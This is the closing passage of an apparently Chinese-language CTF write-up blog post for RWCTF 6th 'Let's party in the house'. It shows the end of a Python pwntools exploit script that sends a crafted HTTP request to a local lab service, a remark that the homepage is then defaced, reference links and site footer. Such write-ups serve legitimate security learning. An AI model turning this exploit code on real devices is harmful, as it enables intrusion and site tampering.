Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>重新访问就可以看到主页被篡改</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/archives/2076">https://eqqie.cn/index.php/archives/2076</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tuzhutuzhu/article/details/23705485">https://blog.csdn.net/tuzhutuzhu/article/details/23705485</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF-6th-Let%E2%80%99s-party-in-the-house"><span class="toc-number">1.</span> <span class="toc-text">RWCTF 6th - Let’s party in the house</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%85%8D%E7%BD%AE-amp-%E5%90%AF%E5%8A%A8"><span class="toc-number">1.1.</span> <span class="toc-text">题目配置&amp;启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-amp-%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">Poc&amp;调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;text=RWCTF 6th - Let’s party in the house"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;is_video=false&amp;description=RWCTF 6th - Let’s party in the house"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF 6th - Let’s party in the house&amp;body=Check out this article: http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;name=RWCTF 6th - Let’s party in the house&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;t=RWCTF 6th - Let’s party in the house"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>